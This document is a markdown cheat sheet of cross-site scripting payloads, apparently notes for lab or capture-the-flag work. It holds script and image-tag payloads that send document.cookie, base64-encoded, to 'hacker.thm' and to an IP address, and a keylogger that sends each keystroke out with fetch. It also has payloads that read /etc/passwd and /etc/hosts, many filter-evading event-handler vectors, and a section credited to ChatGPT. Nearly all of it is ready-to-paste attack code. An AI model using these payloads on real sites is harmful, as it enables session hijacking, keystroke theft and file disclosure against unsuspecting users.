#### Steal Cookie : 
( Result will be base64 encoded )
```js
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

<script>alert(document.cookie);</script>

<img src="x" onerror="this.src='http://10.10.15.123/?c='+btoa(document.cookie)">

alert(document.cookie)
alert(document['cookie'])
with(document)alert(cookie) 
```

### Key-Logger : 
```js
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

<script type="text/javascript"> let l = ""; // Variable to store key-strokes in  
 document.onkeypress = function (e) { // Event to listen for key presses  
   l += e.key; // If user types, log it to the l variable  
   console.log(l); // update this line to post to your own server  
 }</script>

```

### Alert Payloads : 
```js
<script>alert('Found')</script>
"><script>alert(Found)</script>">
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert("XSS")</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(window.origin)</script>

" onload="alert(String.fromCharCode(88,83,83))
" onload="alert('XSS')
' onfocus=’alert(1)'
' onfocus=’alert(1)' autofocus='
' onmouseover=’alert(1)'

<script>document.write(document.location.href)</script>
<h1>r3dbucket</h1>
<img src="x" onerror="document.write('test')" />

<a onmouseover="alert('Hi!')">
HOVER ME
</a>

<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(‘GET’,’file:///etc/hosts’);x.send();</script>

<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(‘GET’,’file:///etc/passwd’);x.send();</script>														   ```
```

### Without Alert but alert : 

```js
<svg onload=prompt(1)>
<script>prompt('xss')</script>
<img src=x onerror=confirm(String.fromCharCode(88,83,83))>
<object data="javascript:alert(0)"> 

<object><param name="src" value=
"javascript:alert(0)"></param></object>

<img src=x:alert(alt) onerror=eval(src) alt=0> 

```

## payloads By ChatGPT : 

###### Without Script and alert : 
```sh
<img src="x" onerror="prompt(1)">
<input onfocus="eval(name)" autofocus>
<svg/onload="confirm(1)">
<body onpageshow="prompt(1)">
<video src="x" onloadstart="prompt(1)">
<form action="javascript:confirm(1)">
<marquee onstart="prompt(1)">
<isindex action="javascript:prompt(1)">
<object data="data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4">
<scrIpt src="data:text/javascript,prompt(1)">
<audio src="x" onplay="prompt(1)">
<button onclick="eval(name)">click</button>
<select onchange="eval(name)"><option>click</option></select>
<textarea onkeydown="prompt(1)">
<keygen onfocus="prompt(1)">
<img src="x" onerror="eval(name)">
<body onbeforeunload="prompt(1)">
<link rel="stylesheet" href="javascript:confirm(1)">
<base href="javascript:prompt(1)"/>
<meta http-equiv="refresh" content="0;javascript:prompt(1)">
```
